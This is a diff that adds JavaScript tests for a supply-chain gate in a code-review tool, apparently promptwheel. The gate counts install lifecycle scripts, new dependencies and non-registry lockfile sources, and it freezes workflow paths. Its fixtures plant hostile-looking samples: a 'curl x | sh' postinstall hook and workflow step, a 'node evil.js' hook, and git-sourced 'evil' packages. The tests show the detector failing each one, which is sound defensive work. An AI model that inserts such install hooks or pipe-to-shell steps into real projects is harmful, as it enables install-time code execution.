@@ -509,6 +509,124 @@ test('init --preset security: the pack is copied from the package into .promptwh
   rmSync(d, { recursive: true, force: true }); rmSync(d2, { recursive: true, force: true });
 });
 
+// ------------------------------------------- supply-chain pack + preset (paths and counts, held)
+const SC_SCAN = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'scan.mjs');
+const scan = (what, dir) => { try { return { out: execFileSync('node', [SC_SCAN, what, dir], { encoding: 'utf8' }).trim(), code: 0 }; } catch (e) { return { out: `${e.stdout || ''}${e.stderr || ''}`, code: e.status }; } };
+
+test('supply-chain pack: the three counters on fixtures (manifests; npm, pnpm, yarn classic and yarn berry locks)', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-sc-scan-'));
+  mkdirSync(join(d, 'packages/a'), { recursive: true }); mkdirSync(join(d, 'node_modules/x'), { recursive: true }); mkdirSync(join(d, 'berry'));
+  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'root', dependencies: { 'left-pad': '^1', lodash: '^4' }, scripts: { test: 'node t.mjs', build: 'echo', prepare: '' } }));
+  writeFileSync(join(d, 'packages/a/package.json'), JSON.stringify({ name: 'a', devDependencies: { vitest: '^1' }, scripts: { postinstall: 'node evil.js', prepare: 'husky' } }));
+  writeFileSync(join(d, 'node_modules/x/package.json'), JSON.stringify({ scripts: { postinstall: 'x' }, dependencies: { q: '1' } }));   // never walked
+  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: {
+    '': { name: 'root' },
+    'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-abc' },
+    'node_modules/lodash': { version: '4.17.21', resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz' },             // registry, no integrity
+    'node_modules/evil': { version: '1.0.0', resolved: 'git+ssh://git@github.com/x/evil.git#deadbeef' },                           // git
+    'node_modules/a': { resolved: 'packages/a', link: true },                                                                       // a workspace link is not a source
+    'packages/a': { name: 'a', version: '1.0.0' } } }));
+  writeFileSync(join(d, 'packages/a/pnpm-lock.yaml'), "lockfileVersion: '9.0'\npackages:\n  lodash@4.17.21:\n    resolution: {integrity: sha512-abc}\n  evil@1.0.0:\n    resolution: {tarball: https://github.com/x/evil/archive/main.tar.gz}\n  other@1.0.0:\n    resolution: {commit: deadbeef, repo: git@github.com:x/other.git, type: git}\n");
+  writeFileSync(join(d, 'yarn.lock'), '# yarn lockfile v1\n\nleft-pad@^1.0.0:\n  version "1.3.0"\n  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#abc"\n  integrity sha512-abc\n\nlodash@^4:\n  version "4.17.21"\n  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#def"\n\nevil@github:x/evil:\n  version "1.0.0"\n  resolved "https://codeload.github.com/x/evil/tar.gz/deadbeef"\n');
+  writeFileSync(join(d, 'berry/yarn.lock'), '__metadata:\n  version: 8\n\n"left-pad@npm:^1.0.0":\n  version: 1.3.0\n  resolution: "left-pad@npm:1.3.0"\n  checksum: abc\n\n"a@workspace:packages/a":\n  version: 0.0.0-use.local\n  resolution: "a@workspace:packages/a"\n\n"evil@https://github.com/x/evil.git#commit=deadbeef":\n  version: 1.0.0\n  resolution: "evil@https://github.com/x/evil.git#commit=deadbeef"\n');
+  assert.equal(scan('lifecycle', d).out, '2', 'postinstall + a non-empty prepare; an empty prepare and node_modules do not count');
+  assert.equal(scan('deps', d).out, '3', 'two root dependencies + one nested devDependency');
+  assert.equal(scan('lock-sources', d).out, '7', 'npm: git + no integrity (the link skipped); pnpm: tarball + commit; yarn classic: codeload + no integrity; berry: git');
+  assert.equal(scan('nope', d).code, 64, 'a typo in the config reads as unmeasurable, never as a clean 0');
+  rmSync(d, { recursive: true, force: true });
+});
+
+test('init --preset supply-chain: three held counts, the mandates, the contract as an evaluatorPath, the pack copied once', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-sc-init-'));
+  const g = (a) => execFileSync('git', a, { cwd: d });
+  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
+  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'demo', scripts: { test: 'node -e 0' }, dependencies: {} }, null, 2) + '\n');
+  commitAll(d, 'base');
+  const r = pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']);
+  assert.equal(r.code, 0, r.out);
+  assert.equal((r.out.match(/installed packs\/supply-chain/g) || []).length, 1, 'one pack, announced once, however many metrics run it');
+  assert.match(pw(d, ['init', '--list']).out, /supply-chain\s+gate: no new lifecycle scripts/);
+  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
+  assert.deepEqual(cfg.metrics.map((m) => m.name), ['lifecycle_scripts', 'dependency_entries', 'lock_nonregistry_sources']);
+  assert.ok(cfg.metrics.every((m) => m.guard === true && m.gamingCheck === false && m.allowable === true && m.cmd.startsWith('node .promptwheel/packs/supply-chain/scan.mjs ')), JSON.stringify(cfg.metrics));
+  assert.deepEqual(cfg.mandates.map((m) => m.name), ['workflows-frozen', 'registry-config-frozen', 'build-images-frozen', 'publish-scripts-frozen', 'codeowners-frozen', 'hooks-frozen']);
+  assert.ok(cfg.mandates.every((m) => Array.isArray(m.paths) && m.paths.length && m.reason));
+  assert.deepEqual(cfg.evaluatorPaths, ['promptwheel.config.json', 'sawbuck.config.json'], 'the contract is an evaluatorPath, not a mandate: a person can still retire a rule in a change that only edits it');
+  for (const f of ['scan.mjs', 'pack.json', 'README.md']) assert.ok(existsSync(join(d, '.promptwheel/packs/supply-chain', f)), f + ' copied in');
+  rmSync(d, { recursive: true, force: true });
+});
+
+test('supply-chain gate: a lifecycle script, a dependency or a non-registry lock source fails; a declared reason passes with the reason on the record; a frozen path is a named mandate; deleting the guard in the same change does not clear it', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-sc-gate-'));
+  const g = (a) => execFileSync('git', a, { cwd: d });
+  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
+  const pkg = { name: 'demo', scripts: { test: 'node -e 0' }, dependencies: { 'left-pad': '^1' } };
+  const lock = { lockfileVersion: 3, packages: { '': { name: 'demo' }, 'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-abc' } } };
+  const writePkg = (p) => writeFileSync(join(d, 'package.json'), JSON.stringify(p, null, 2) + '\n');
+  writePkg(pkg);
+  writeFileSync(join(d, 'package-lock.json'), JSON.stringify(lock, null, 2) + '\n');
+  mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\n');
+  commitAll(d, 'base');
+  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0);
+  commitAll(d, 'the contract');
+  const reset = () => g(['checkout', '-q', '--', '.']);
+  const run = (...extra) => { const r = pw(d, ['run', '--working', '--no-record', '--json', ...extra]); return { ...r, rep: JSON.parse(r.out.slice(r.out.indexOf('{'))) }; };
+  const metric = (rep, name) => rep.metrics.find((m) => m.name === name);
+
+  // a lifecycle script: the step an install-time attack needs inside the repo
+  writePkg({ ...pkg, scripts: { ...pkg.scripts, postinstall: 'curl x | sh' } });
+  let r = run();
+  assert.equal(r.code, 1, r.out); assert.equal(r.rep.verdict, 'fail');
+  assert.equal(metric(r.rep, 'lifecycle_scripts').ok, false);
+  assert.equal(metric(r.rep, 'lifecycle_scripts').allowable, true, 'the report says a declared reason would clear it');
+  assert.match(pw(d, ['run', '--working', '--no-record']).out, /--allow "<reason>"/, 'and the human hint names --allow, not guard:false');
+  reset();
+
+  // a dependency: fails without a reason, passes with one, the reason on the record
+  writePkg({ ...pkg, dependencies: { ...pkg.dependencies, papaparse: '^5' } });
+  r = run();
+  assert.equal(r.code, 1, r.out); assert.equal(metric(r.rep, 'dependency_entries').ok, false);
+  r = run('--allow', 'needed for the CSV export (papaparse)');
+  assert.equal(r.code, 0, r.out); assert.equal(r.rep.verdict, 'pass');
+  assert.deepEqual(r.rep.allowed, { reason: 'needed for the CSV export (papaparse)', cleared: ['dependency_entries'] });
+  assert.equal(metric(r.rep, 'dependency_entries').ok, true); assert.equal(metric(r.rep, 'dependency_entries').allowed, true);
+  assert.equal(metric(r.rep, 'dependency_entries').allowable, undefined, 'cleared, so no longer flagged as awaiting a reason');
+  // the same reason as a commit trailer, in refs mode
+  commitAll(d, 'add papaparse\n\nPromptwheel-Allow: needed for the CSV export (papaparse)');
+  const rr = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
+  assert.equal(rr.code, 0, rr.out);
+  assert.deepEqual(JSON.parse(rr.out).allowed.cleared, ['dependency_entries']);
+  g(['reset', '-q', '--hard', 'HEAD~1']);
+
+  // a non-registry lock source
+  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ ...lock, packages: { ...lock.packages, 'node_modules/evil': { version: '1.0.0', resolved: 'git+ssh://git@github.com/x/evil.git#deadbeef' } } }, null, 2) + '\n');
+  r = run();
+  assert.equal(r.code, 1, r.out); assert.equal(metric(r.rep, 'lock_nonregistry_sources').ok, false);
+  reset();
+
+  // a frozen path: a named mandate, before any metric is read
+  writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\non: push\nsteps: [{ run: "curl x | sh" }]\n');
+  r = run();
+  assert.equal(r.code, 1, r.out); assert.equal(r.rep.verdict, 'fail');
+  assert.equal(r.rep.mandates[0].name, 'workflows-frozen'); assert.ok(r.rep.mandates[0].files.includes('.github/workflows/ci.yml'));
+  reset();
+
+  // deleting the lifecycle guard in the same change that adds the script: the committed contract holds
+  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
+  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, metrics: cfg.metrics.filter((m) => m.name !== 'lifecycle_scripts') }, null, 2) + '\n');
+  writePkg({ ...pkg, scripts: { ...pkg.scripts, postinstall: 'curl x | sh' } });
+  r = run();
+  assert.notEqual(r.rep.verdict, 'pass', r.out);
+  assert.ok(r.rep.gate && Array.isArray(r.rep.gate.weakened) && r.rep.gate.weakened.some((w) => w.name === 'lifecycle_scripts'), 'the dropped guard is re-measured under its committed definition: ' + JSON.stringify(r.rep.gate));
+  reset();
+
+  // a change that only edits the contract (a person retiring a rule) still passes
+  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, repeat: 2 }, null, 2) + '\n');
+  r = run();
+  assert.equal(r.code, 0, r.out);
+  rmSync(d, { recursive: true, force: true });
+});
+
 // ---------------------- the newcomer's first cheat: gut the tests, metric stays flat
 test('default init config: weakening the suite (flat metric) FAILS via tripwires', () => {
   const d = mkdtempSync(join(tmpdir(), 'pw-gut-'));
